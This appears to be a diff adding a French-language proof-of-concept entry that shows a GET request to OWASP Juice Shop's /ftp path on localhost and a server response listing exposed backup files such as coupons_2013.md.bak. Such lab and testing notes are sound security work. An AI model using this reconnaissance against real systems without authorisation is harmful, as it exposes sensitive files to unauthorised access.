@@ -1,0 +1,26 @@
+### SEC-VULN-03: Preuve de Concept - Path Traversal / Directory Listing
+### Cible : OWASP Juice Shop /ftp
+
+GET /ftp HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Connection: close
+
+### RÉPONSE DU SERVEUR (HTTP 200 OK avec listing de répertoires actif et fichiers .bak exposés) :
+# HTTP/1.1 200 OK
+# Content-Type: text/html; charset=utf-8
+# 
+# <!DOCTYPE html>
+# <html>
+# <head><title>listing directory /ftp</title></head>
+# <body>
+# <h1>Directory: /ftp</h1>
+# <ul>
+#   <li><a href="/ftp/acquisitions.md">acquisitions.md</a></li>
+#   <li><a href="/ftp/coupons_2013.md.bak">coupons_2013.md.bak</a> [SENSITIVE BACKUP]</li>
+#   <li><a href="/ftp/legal.md">legal.md</a></li>
+#   <li><a href="/ftp/package.json.bak">package.json.bak</a></li>
+# </ul>
+# </body>
+# </html>
